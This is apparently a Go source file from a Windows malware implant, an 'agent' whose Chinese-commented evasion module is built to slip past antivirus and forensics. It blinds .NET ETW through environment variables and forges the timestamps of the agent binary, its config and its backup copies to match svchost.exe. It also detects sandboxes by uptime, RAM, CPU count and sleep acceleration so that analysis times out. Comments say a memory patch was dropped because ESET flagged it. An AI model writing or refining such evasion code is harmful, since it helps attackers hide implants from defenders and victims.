//go:build windows

package main

import (
	"log"
	"math/rand"
	"os"
	"path/filepath"
	"runtime"
	"syscall"
	"time"
	"unsafe"
)

// ═══ 免杀模块 ═══
// ETW 内存补丁已移除（VirtualProtect+ntdll写入 是 ESET WinGo/Agent.ALX 主要检测源）
// 改用环境变量方式抑制 ETW + 反沙箱检测 + 时间戳伪造 + 进程保护

var (
	modKernel32Evasion = syscall.NewLazyDLL("kernel32.dll")
	procSetFileTime    = modKernel32Evasion.NewProc("SetFileTime")
	procCreateFileW    = modKernel32Evasion.NewProc("CreateFileW")
	procCloseHandle    = modKernel32Evasion.NewProc("CloseHandle")
)

// patchAMSI — 已禁用
func patchAMSI() {}

// blindETW 通过环境变量抑制 ETW（不触发内存补丁检测）
func blindETW() {
	// 设置环境变量禁用 .NET ETW provider（不需要 ntdll 补丁）
	os.Setenv("COMPlus_ETWEnabled", "0")
	os.Setenv("COMPlus_LegacyCorruptedStateExceptionsPolicy", "1")
}

// timestomp 伪造文件时间戳
// 将 agent 文件的创建/修改/访问时间设置为 svchost.exe 的时间
// 避免按时间排序时发现异常新文件
func timestomp() {
	// 读取 svchost.exe 的时间信息
	svchost := filepath.Join(os.Getenv("SystemRoot"), "System32", "svchost.exe")
	refInfo, err := os.Stat(svchost)
	if err != nil {
		return
	}
	refTime := refInfo.ModTime()

	// 需要伪造时间的文件列表
	targets := []string{
		sid().ExePath,
		sid().Dir,
		filepath.Join(sid().Dir, "agent.conf"),
	}
	// 也伪造备份位置
	for _, loc := range getBackupLocations() {
		targets = append(targets, filepath.Join(loc.Dir, loc.ExeName))
		targets = append(targets, loc.Dir)
	}

	ft := syscallFileTime(refTime)
	for _, target := range targets {
		setFileTimestamp(target, &ft)
	}
	log.Printf("[免杀] 时间戳伪造完成")
}

// setFileTimestamp 设置单个文件的所有时间戳
func setFileTimestamp(path string, ft *syscall.Filetime) {
	pathPtr, err := syscall.UTF16PtrFromString(path)
	if err != nil {
		return
	}
	// OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS (支持目录)
	handle, _, _ := procCreateFileW.Call(
		uintptr(unsafe.Pointer(pathPtr)),
		0x0100, // FILE_WRITE_ATTRIBUTES
		0x07,   // FILE_SHARE_READ|WRITE|DELETE
		0,
		3,          // OPEN_EXISTING
		0x02000000, // FILE_FLAG_BACKUP_SEMANTICS
		0,
	)
	if handle == 0 || handle == ^uintptr(0) {
		return
	}
	defer procCloseHandle.Call(handle)
	// 设置创建时间、访问时间、修改时间
	procSetFileTime.Call(handle,
		uintptr(unsafe.Pointer(ft)), // creation
		uintptr(unsafe.Pointer(ft)), // access
		uintptr(unsafe.Pointer(ft)), // write
	)
}

// syscallFileTime 将 time.Time 转换为 Windows FILETIME
func syscallFileTime(t time.Time) syscall.Filetime {
	// Windows FILETIME: 100ns intervals since 1601-01-01
	nsec := t.UnixNano()
	// Offset between Unix epoch (1970) and Windows epoch (1601): 116444736000000000
	ft := nsec/100 + 116444736000000000
	return syscall.Filetime{
		LowDateTime:  uint32(ft),
		HighDateTime: uint32(ft >> 32),
	}
}

// antiSandbox 反沙箱检测
// 检测系统运行时间、物理内存、CPU核心数等判断是否在沙箱中运行
func antiSandbox() bool {
	// 1. 检查系统运行时间（沙箱通常运行时间很短）
	uptimeMs, _, _ := procGetTickCount64.Call()
	uptimeMin := int(uptimeMs) / 60000
	if uptimeMin < 10 {
		// 系统刚启动不到10分钟，可能是沙箱，等待一段随机时间
		sleepMs := 3000 + rand.Intn(5000)
		time.Sleep(time.Duration(sleepMs) * time.Millisecond)
	}

	// 2. 检查物理内存（沙箱通常内存很少）
	type memStatusEx struct {
		Length               uint32
		MemoryLoad           uint32
		TotalPhys            uint64
		AvailPhys            uint64
		TotalPageFile        uint64
		AvailPageFile        uint64
		TotalVirtual         uint64
		AvailVirtual         uint64
		AvailExtendedVirtual uint64
	}
	var ms memStatusEx
	ms.Length = uint32(unsafe.Sizeof(ms))
	procGlobalMemoryStatusEx.Call(uintptr(unsafe.Pointer(&ms)))
	totalGB := ms.TotalPhys / (1024 * 1024 * 1024)
	if totalGB < 2 {
		return false // 内存不足 2GB，可能是沙箱
	}

	// 3. 检查 CPU 核心数
	if runtime.NumCPU() < 2 {
		return false // 单核，可能是沙箱
	}

	// 4. 时间加速检测：Sleep 精度检查
	start := time.Now()
	time.Sleep(1200 * time.Millisecond)
	elapsed := time.Since(start)
	if elapsed < 1000*time.Millisecond {
		return false // Sleep 被跳过，沙箱环境
	}

	return true
}

// applyAllEvasion 一键启用所有免杀措施
func applyAllEvasion() {
	// 反沙箱：在沙箱环境中延迟或退出
	if !antiSandbox() {
		// 沙箱检测到，静默等待后退出（让沙箱超时判定为安全）
		time.Sleep(time.Duration(30+rand.Intn(30)) * time.Second)
	}
	blindETW()
	timestomp()
}
